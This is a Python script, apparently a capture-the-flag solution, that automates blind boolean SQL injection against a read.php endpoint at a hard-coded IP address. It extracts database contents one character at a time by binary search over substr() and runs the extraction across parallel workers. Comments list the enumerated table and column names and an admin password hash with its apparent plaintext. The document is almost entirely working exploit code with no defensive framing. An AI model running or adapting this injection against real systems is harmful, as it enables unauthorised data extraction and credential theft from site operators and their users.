import requests
from hexdump import hexdump

def b(x):
  while 1:
    data = {}
    data['id'] = "1'+("+str(x)+") -- "
    r = requests.get("http://175.119.158.137:9242/f00885da9ad9ad5fcccaa8fc1217e3ae/read.php", params=data)
    if "Test Test" in r.text:
      return True
    elif "Manager" in r.text:
      return False
    elif ", " in r.text:
      raise Exception("SQL error")
    else:
      print r.text

def bsearch(expr, lo=0, hi=0x7e):
  hi += 1
  while lo != hi:
    print lo, hi
    mid = (lo+hi)/2
    if chr(mid) == "'":
      ass = "\"'\""
    else:
      ass = "'" + chr(mid) + "'"
    if b("(" + expr + ")<" + str(ass)):
      hi = mid
    else:
      lo = mid+1
  return lo-1

# len is 20

def single(a):
  i,qq = a
  return chr(bsearch('substr(('+qq+'), '+str(i+1)+', 1)'))

def query(qq):
  c = ""
  for i in range(0, 64):
    c += single([i, qq])
    print c


from multiprocessing import Pool
def multiquery(qq, cnt=32):
  a = Pool(cnt)
  al = []
  for i in range(0, cnt):
    al.append([i, qq])
  print ''.join(a.map(single, al))

#print b("0"), b("1")


# get tables in this db
#query("SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()")

# tables = BLOG, LOGIN
# LOGIN: USER, PASS
# BLOG: ID,DATETIME,WRITER,TYPE,TITLE,CONTENTS,FILE
#multiquery("SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'blog'")


# post 0
# SECRET FILE

# admin : 70E76A15DA00E6301ADE718CC9416F79 ( adminpw )
#multiquery("SELECT GROUP_CONCAT(file) FROM blog WHERE id=0", 64)
multiquery("SELECT GROUP_CONCAT(file) FROM blog", 64)


